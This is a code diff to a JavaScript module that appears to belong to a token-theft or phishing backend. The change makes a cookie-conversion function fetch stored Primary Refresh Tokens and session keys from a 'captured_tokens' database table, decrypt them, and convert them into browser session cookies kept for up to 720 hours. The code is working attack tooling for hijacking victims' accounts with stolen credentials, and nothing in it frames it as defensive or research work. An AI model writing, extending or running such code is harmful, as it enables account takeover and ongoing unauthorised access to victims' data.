@@ -2,7 +2,7 @@
 
 const db = require('../database/connection');
 const config = require('../config/env');
-const { encrypt } = require('../utils/encrypt');
+const { encrypt, decrypt } = require('../utils/encrypt');
 const prtkdf = require('./prtkdf');
 
 function detectAccountType(email) {
@@ -161,7 +161,35 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
 }
 
 async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType, userId) {
-  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType, userId);
+  let tokenInput = accessToken;
+
+  if (tokenId) {
+    try {
+      const [rows] = await db.query(
+        'SELECT prt, session_key_jwe, session_key_encrypted FROM captured_tokens WHERE id = ? LIMIT 1',
+        [tokenId]
+      );
+      if (rows && rows.length) {
+        const row = rows[0];
+        const storedPrt = row.prt ? decrypt(row.prt) : null;
+        const storedSessionKey = row.session_key_jwe ? decrypt(row.session_key_jwe) : (row.session_key_encrypted ? decrypt(row.session_key_encrypted) : null);
+
+        if (storedPrt && storedSessionKey) {
+          tokenInput = {
+            prt: storedPrt,
+            sessionKey: storedSessionKey,
+            session_key_jwe: storedSessionKey,
+          };
+        } else if (storedPrt) {
+          tokenInput = { prt: storedPrt, sessionKey: accessToken || null };
+        }
+      }
+    } catch (err) {
+      console.warn('[CookieConverter] Could not load stored PRT/session key from DB:', err.message);
+    }
+  }
+
+  const result = await convertTokensToCookies(tokenInput, templateType, tenant, null, accountType, userId);
 
   if (result.success && result.cookies) {
     const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
